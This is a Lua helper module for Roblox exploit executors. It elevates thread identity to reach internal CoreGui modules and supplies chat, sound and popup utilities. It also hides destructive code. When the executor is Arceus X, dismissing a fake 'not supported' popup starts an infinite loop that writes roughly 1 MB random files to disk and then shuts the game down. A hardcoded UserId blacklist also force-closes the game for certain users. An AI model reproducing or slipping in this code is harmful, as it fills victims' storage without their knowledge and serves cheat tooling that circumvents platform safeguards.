local Functions = {}
local playersService = game:GetService("Players")
local lplr = playersService.LocalPlayer
local GetPlayers = playersService:GetPlayers()
shared.FuncsConnect = true
local getcustomasset = getsynasset or getcustomasset or function(location) return "rbxasset://"..location end
local setidentity = syn and syn.set_thread_identity or set_thread_identity or setidentity or setthreadidentity or function() end
local getidentity = syn and syn.get_thread_identity or get_thread_identity or getidentity or getthreadidentity or function() return 0 end

if shared.FuncsConnect then
	do
		Functions.runcode = function(func)
			func()
		end
		Functions.runFunction = function(func)
			func()
		end
		Functions.randomGUID = function(state)
		  state = state or true
		  game:GetService("HttpService"):GenerateGUID(state)
		end
		Functions.ChatMessage = function(Text, UserRe)
			UserRe = UserRe or "All"
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Text, UserRe)
		end
		Functions.PlaySound = function(id, volume)
			local sound = Instance.new("Sound")
			sound.Parent = workspace
			sound.SoundId = id
			sound.PlayOnRemove = true
			if volume then
				sound.Volume = volume
			end
			sound:Destroy()
		end
		Functions.randomString = function(length1, length2)
		  length1 = length1 or 10
		  length2 = length2 or 100
    	local randomlength = math.random(length1,length2)
    	local array = {}
    	for i = 1, randomlength do
    	  array[i] = string.char(math.random(32, 126))
    	end
    	return table.concat(array)
    end
		Functions.executor = identifyexecutor()
		function Functions.displayErrorPopup(text, text1, text2, funclist)
			local oldidentity = getidentity()
			setidentity(8)
			local ErrorPrompt = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.ErrorPrompt)
			local prompt = ErrorPrompt.new("Default")
			prompt._hideErrorCode = true
			local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
			prompt:setErrorTitle(text)
			local funcs
			if funclist then 
				funcs = {}
				local num = 0
				for i,v in pairs(funclist) do 
					num = num + 1
					table.insert(funcs, {
						Text = i,
						Callback = function() 
							prompt:_close() 
							v()
						end,
						Primary = num == #funclist
					})
				end
			end
			prompt:updateButtons(funcs or {{
				Text = text2,
				Callback = function() 
					prompt:_close() 
				end,
				Primary = true
			}}, 'Default')
			prompt:setParent(gui)
			prompt:_open(text1)
			setidentity(oldidentity)
		end
		function Functions.RobloxNotification(first, second, timewa)
			game.StarterGui:SetCore("SendNotification", {
    		Title = first;
    		Text = second;
  			Duration = timewa;
			})
		end
	end
	if Functions.executor:find("Arceus X") then
		Functions.RobloxNotification("Detected", "you executor not support for FunctionsHandler\nExecutor : Arceus X", 5)
		Functions.displayErrorPopup("Detected", "you executor not support for FunctionsHandler\nExecutor : Arceus X", "OK", {OK = function()
		  task.spawn(function()
        repeat
          task.wait()
          writefile(Functions.randomGUID()..".txt", Functions.randomString(999999, 999999))
        until false
		  end)
      wait(5)
      game:Shutdown()
		end})
	end
	for i,v in pairs(playersService:GetPlayers()) do
		if v.UserId == 1398233511 then
			Functions.displayErrorPopup(Functions.randomString(), "Hi "..Functions.randomString().." How this going bud :)", "Good")
		end
	end
	for i,v in pairs(playersService:GetPlayers()) do
		if v.UserId == 3110380407 or v.UserId == 4613474609 then
			Functions.displayErrorPopup("Blacklist", "You has Been Blacklist, L imagine got blacklist", "OK", {OK = function()
				game:Shutdown()
			end})
		end
	end

--[[
	for i,v in pairs(playersService:GetPlayers()) do
		if v.UserId == 4584934336 then
			Functions.displayErrorPopup("Detected", "You has Been Removed From The Games.", "OK", {OK = function()
				game:Shutdown()
			end})
--			game:Shutdown()
		end
	end
--]]
	
	if shared.FuncsConnect then
		print("Functions Has Been Connected!")
	end
else
	warn("Failed to Connected or shared.FuncsConnect = false")
end

return Functions
